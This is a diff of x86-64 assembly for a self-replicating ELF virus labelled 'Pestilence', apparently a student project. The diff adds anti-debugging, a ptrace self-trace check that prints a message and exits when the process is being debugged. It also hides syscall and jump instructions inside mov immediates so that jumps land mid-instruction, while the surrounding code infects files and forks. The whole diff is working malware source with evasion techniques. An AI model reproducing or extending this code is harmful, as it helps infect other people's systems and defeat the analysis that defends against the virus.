@@ -37,20 +37,37 @@ _start:
 	call _inject; push addr to stack
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
-debug_msg db `DEBUGGING..`, 0x0; sw4g signature
+debug_msg db `DEBUGGING..\n`, 0x0; sw4g signature
 
 _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
 
-	mov rax, 0x4242422aeb424242
+	xor rdi, rdi; PTRACE_TRACEME
+	xor rsi, rsi
+	xor rdx, rdx
+	xor rcx, rcx
+	mov rax, 101; ptrace
+	syscall
+
+	cmp rax, 0x0
+	jz $+46; has to jmp on [48 31 c0]
+
+	mov rdi, 2
+	lea rsi, [rel debug_msg]
+	mov rdx, 12
+	mov rax, 1
+	syscall
+
+	jmp $+4; has to skip 2 byte of instruction next line
+	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
+	;                            from right to left
+	mov rax, 0xc0314827eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	; copy the prg in memory and launch it
-	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne $-15
-
+	jne $-15; has to jmp on [eb 27]
 
 	mov rax, SYSCALL_FORK; fork
 	syscall
